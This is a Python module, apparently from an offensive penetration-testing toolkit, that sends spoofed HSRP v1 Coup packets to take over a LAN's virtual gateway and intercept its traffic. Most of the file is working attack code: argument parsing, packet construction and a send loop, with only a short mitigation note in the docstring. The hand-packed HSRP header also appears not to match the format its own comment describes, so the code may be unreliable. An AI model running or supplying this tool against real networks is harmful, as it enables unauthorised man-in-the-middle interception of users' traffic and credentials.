"""
HSRP Active Takeover — T1557

Sends spoofed HSRP Coup to win Active role for a standby group.
Once Active, the attacker answers ARP for the virtual IP and
receives all gateway-bound traffic — transparent MITM with IP forwarding.

Requires: attacker on same L2 as HSRP peers, HSRP v1 plaintext (default
"cisco" auth). Preflight: sniff UDP/1985 to learn group + virtual IP first.

Mitigation: HSRP MD5 authentication, priority + preempt hardening,
DAI + DHCP snooping on access ports.
"""
import struct
import time

from scapy.all import Ether, IP, UDP, Raw, sendp

NAME = "hsrp"
DESCRIPTION = "HSRP Active takeover via spoofed Coup — gateway MITM"
ATTCK_ID = "T1557"

MCAST_MAC = "01:00:5e:00:00:02"
MCAST_IP = "224.0.0.2"


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help=f"{DESCRIPTION} ({ATTCK_ID})",
                              description=__doc__)
    p.add_argument("-i", "--interface", required=True)
    p.add_argument("--group", type=int, default=1, help="HSRP group number")
    p.add_argument("--virtual-ip", required=True, help="HSRP virtual IP to claim")
    p.add_argument("--priority", type=int, default=255,
                   help="Priority to claim (default 255 = always wins)")
    p.add_argument("--auth", default="cisco", help="Plaintext auth string (default cisco)")
    p.add_argument("-c", "--count", type=int, default=10)
    p.add_argument("--interval", type=float, default=1.0)
    p.add_argument("--verbose", "-v", action="store_true")
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    from core.common import require_root
    require_root()
    logger.info("START | technique=%s | iface=%s | group=%d | vip=%s | prio=%d",
                ATTCK_ID, args.interface, args.group, args.virtual_ip, args.priority)
    ok = _execute(args, logger)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1


def _hsrp_coup(group, priority, virtual_ip, auth):
    # HSRP v1: 00 00 07 00 | opcode | state | hello hold prio group rsvd | auth(8) | vip(4)
    auth_b = auth.encode()[:8].ljust(8, b"\x00")
    vip_b = bytes(int(x) for x in virtual_ip.split("."))
    hdr = struct.pack("!BBBBBBB", 0x00, 0x00, 0x07, 0x00, 0x01, 0x10, 0x03)
    body = struct.pack("!BBBB", 0x03, priority, group, 0x00) + auth_b + vip_b
    return hdr + body


def _execute(args, logger=None):
    _log = logger.info if logger else print
    payload = _hsrp_coup(args.group, args.priority, args.virtual_ip, args.auth)
    pkt = (Ether(dst=MCAST_MAC) / IP(dst=MCAST_IP, ttl=1) /
           UDP(sport=1985, dport=1985) / Raw(load=payload))
    try:
        for i in range(args.count):
            sendp(pkt, iface=args.interface, verbose=args.verbose)
            if (i + 1) % 5 == 0:
                _log(f"[HSRP] Coup {i+1}/{args.count} group={args.group} vip={args.virtual_ip}")
            time.sleep(args.interval)
        _log("[HSRP] Done — verify with 'show standby brief' on peer; ARPing vip should return attacker MAC")
        return True
    except Exception as e:
        _log(f"[HSRP] Error: {e}")
        return False
